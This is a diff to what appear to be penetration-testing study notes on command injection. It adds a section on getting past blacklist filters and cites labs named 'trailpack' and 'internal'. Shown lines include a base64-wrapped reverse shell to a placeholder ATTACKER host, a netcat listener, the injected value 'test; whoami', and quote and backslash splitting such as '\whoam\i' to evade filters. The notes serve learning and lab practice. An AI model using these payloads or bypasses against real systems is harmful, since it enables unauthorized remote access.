@@ -3,7 +3,7 @@ type: technique
 tags: [ejpt:web-pentest, ejpt:host-net-pentest]
 tools: [netcat]
 cves: []
-related: [[reverse-shells]], [[server-side-template-injection]]
+related: [[reverse-shells]], [[server-side-template-injection]], [[waf-bypass]]
 ---
 
 # Command Injection
@@ -35,6 +35,10 @@ echo 'sh -i >& /dev/tcp/ATTACKER/443 0>&1' | base64
 
 Listener first: `nc -lvnp 443` ([[reverse-shells]], [[netcat]]).
 
+## When the payload gets rejected
+
+A filter may block metacharacters or "dangerous" commands before they reach the shell. Splitting the signature across quotes/backslashes defeats exact-string blacklists — see [[waf-bypass]] (`\whoam\i`, `ba's'h`).
+
 ## Seen in
 
-[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell)
+[[trailpack]] (complaints form `test; whoami` → `balutron` → base64 reverse shell), [[internal]] (path parameter behind a blacklist WAF → `\whoam\i` → quote-split bash reverse shell)
